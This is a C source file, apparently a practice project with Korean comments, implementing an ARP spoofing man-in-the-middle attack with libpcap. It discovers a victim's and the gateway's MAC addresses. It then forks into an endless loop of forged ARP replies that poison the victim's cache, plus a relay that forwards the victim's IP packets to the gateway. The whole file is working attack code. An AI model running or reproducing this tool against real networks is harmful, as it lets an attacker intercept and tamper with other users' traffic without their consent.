#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<string.h>
#include<netinet/ether.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<pcap/pcap.h>
#include<unistd.h>
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806
#define ARPHRD_ETHER 1
#define ARP_OP_REQUEST 1
#define ARP_OP_REPLY 2
#define BUFF_SIZE 20

void arp_spoofing(pcap_t *p, u_char *fakepacket);
void make_arp_packet(u_char *packet, const struct in_addr sendIP, const struct ether_addr sendMAC, const struct in_addr targIP, const struct ether_addr targMAC, uint16_t arpop);

void arp_spoofing(pcap_t *p, u_char *fakepacket)
{
	while(1)
	{
		pcap_sendpacket(p, fakepacket, sizeof(struct ether_header) + sizeof(struct ether_arp));
		printf("스푸핑 패킷을 보냅니다\n");
	}
	return;
}
		

int main(int argc, char *argv[])
{
	const u_char *recv_packet;
	const u_char *recv_relay_packet;
	u_char *copy_packet;
	char my_ip_buff[BUFF_SIZE];
	char my_mac_buff[BUFF_SIZE];
	char gate_buff[BUFF_SIZE];
	char gate_mac_buff[BUFF_SIZE];
	char errbuf[PCAP_ERRBUF_SIZE];
	char *DevName;
	int i,j;
	struct ether_addr mMac;
	struct ether_addr vMac;
	struct ether_addr bMac;
	struct ether_addr gMac;
	struct in_addr myIP;
	struct in_addr gatewayIP;
	struct in_addr victimIP;
	struct ether_arp *recvArphdr;
	struct ether_header *recvEthdr;
	struct ether_header *recv_relay_Ethdr;
	struct ether_header *copy_Ethdr;
	struct pcap_pkthdr *recv_pkthdr;
	struct pcap_pkthdr *recv_relay_pkthdr;
	pcap_t* ID;
	FILE *fp;
	pid_t pid;


	//자신의 네트워크 정보수집
	
	fp = popen("ifconfig -a | grep 'inet' | grep 'Bcast:' | awk '{print $2}' | awk -F: '{print $2}'", "r");
   	if ( NULL == fp)
	{
		perror( "popen1() 실패");
		return -1;
	}
	fgets(my_ip_buff,BUFF_SIZE,fp);
	fclose(fp);
	inet_aton(my_ip_buff, &myIP);

	fp = popen("ifconfig -a | grep 'HWaddr' | awk '{print $5}'", "r");
   	if ( NULL == fp)
	{
		perror( "popen2() 실패");
		return -1;
	}
	fgets(my_mac_buff,BUFF_SIZE,fp);
	fclose(fp);
	ether_aton_r(my_mac_buff, &mMac);

	fp = popen("route |grep 'default' | awk '{print $2}'", "r");
   	if ( NULL == fp)
	{
		perror( "popen3() 실패");
		return -1;
	}
	fgets(gate_buff,BUFF_SIZE,fp);
	fclose(fp);
	inet_aton(gate_buff, &gatewayIP);


	DevName = pcap_lookupdev(errbuf);
	if(DevName==0)
	{
		printf("Error : [%s]\n", errbuf);
		return 1;
	}
	printf("Network Device Name : [%s]\n", DevName);
	ID = pcap_open_live(DevName, 1024, 1, -1, errbuf);
	inet_aton(argv[1], &victimIP);
	ether_aton_r("ff:ff:ff:ff:ff:ff", &bMac);
	u_char Packet1[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	make_arp_packet(Packet1, myIP, mMac, victimIP, bMac, ARP_OP_REQUEST);
	u_char Packet2[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	make_arp_packet(Packet2, myIP, mMac, gatewayIP, bMac, ARP_OP_REQUEST);
	
	//arp request로 빅팀 맥 알아내기
	while(1)
	{	
		pcap_sendpacket(ID, Packet1, sizeof(struct ether_header) + sizeof(struct ether_arp));
		i= pcap_next_ex(ID, &recv_pkthdr, &recv_packet);
		printf("1...\n");
		printf("%d \n", i);
		if(i!=1)
		{
			printf("recv Error\n");
			continue;
		}
		printf("2...\n");
		recvEthdr=(struct ether_header *)recv_packet;
		if(recvEthdr->ether_type!=htons(ETHERTYPE_ARP))
		{
			printf("not arp packet\n");
			continue;
		}
		recvArphdr = (struct ether_arp *)(recv_packet + sizeof(struct ether_header));
		if(memcmp(&recvArphdr->arp_spa, &victimIP, 4)!=0)
		{
			printf("not victim arp packet\n");
			continue;
		}
		printf("3...\n");
		memcpy(&vMac, &recvArphdr->arp_sha, 6);
		break;
	}
	printf("while문 완료1\n");
	sleep(5);

	//arp request로 게이트웨이 맥 알아내기
	while(1)
	{	
		pcap_sendpacket(ID, Packet2, sizeof(struct ether_header) + sizeof(struct ether_arp));
		i= pcap_next_ex(ID, &recv_pkthdr, &recv_packet);
		printf("4...\n");
		if(i!=1)
		{
			printf("recv Error\n");
			continue;
		}
		printf("5...\n");
		recvEthdr=(struct ether_header *)recv_packet;
		if(recvEthdr->ether_type!=htons(ETHERTYPE_ARP))
		{
			printf("not arp packet\n");
			continue;
		}
		recvArphdr = (struct ether_arp *)(recv_packet + sizeof(struct ether_header));
		if(memcmp(&recvArphdr->arp_spa, &gatewayIP, 4)!=0)
		{
			printf("not gateway arp packet\n");
			continue;
		}
		printf("6...\n");
		memcpy(&gMac, &recvArphdr->arp_sha, 6);
		break;
	}
	printf("while문 완료2\n");
	sleep(5);

	u_char Packet3[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	make_arp_packet(Packet3, gatewayIP, mMac, victimIP, vMac, ARP_OP_REPLY);



	//스푸핑 릴레이 동시 실행

	pid=fork();

	if(pid==-1)
	{
		printf("can't fork\n");
		exit(0);
	}
	if(pid==0)
	{
		while(1)
		{	
			j=pcap_next_ex(ID, &recv_relay_pkthdr, &recv_relay_packet);
			printf("7...\n");
			printf("%d\n", j);
			if(j!=1)
			{
				printf("not recv relay packet\n");
				continue;
			}
			recv_relay_Ethdr=(struct ether_header *)recv_relay_packet;
			printf("8...\n");
			if(recv_relay_Ethdr->ether_type!=htons(ETHERTYPE_IP))
			{
				printf("not ip packet\n");
				continue;
			}
			if(memcmp(&recv_relay_Ethdr->ether_shost, &vMac, 6)!=0)
			{
				printf("not victim ip packet\n");
				continue;
			}
			printf("9...\n");
			memcpy(&recv_relay_Ethdr->ether_shost, &mMac,6);
			memcpy(&recv_relay_Ethdr->ether_dhost, &gMac,6);
			if(memcmp(&recv_relay_Ethdr->ether_dhost, &gMac, 6)!=0)
			{
				printf("잘못들어갔습니다\n");
				continue;
			}
			pcap_sendpacket(ID, recv_relay_packet, recv_relay_pkthdr->len);
			printf("10...\n");
		}

	}
	else
	{
		arp_spoofing(ID, Packet3);
	}
		
	
	pcap_close(ID);
	return 0;
	//..........
}

void make_arp_packet(u_char *packet, const struct in_addr sendIP, const struct ether_addr sendMAC, const struct in_addr targIP, const struct ether_addr targMAC, uint16_t arpop)
{
	struct ether_arp arphdr;
	struct ether_header ethdr;
	ethdr.ether_type = htons(ETHERTYPE_ARP);
	memcpy(ethdr.ether_dhost, &targMAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(ethdr.ether_shost, &sendMAC.ether_addr_octet, ETHER_ADDR_LEN);
	arphdr.arp_hrd = htons(ARPHRD_ETHER);
	arphdr.arp_pro = htons(ETHERTYPE_IP);
	arphdr.arp_hln = ETHER_ADDR_LEN;
	arphdr.arp_pln = sizeof(4);
	arphdr.arp_op = htons(arpop);
	memcpy(&arphdr.arp_sha, &sendMAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(&arphdr.arp_spa, &sendIP.s_addr, sizeof(4));
	memcpy(&arphdr.arp_tha, &targMAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(&arphdr.arp_tpa, &targIP.s_addr, sizeof(4));
	memcpy(packet, &ethdr, sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header), &arphdr, sizeof(struct ether_arp));
	return;
}
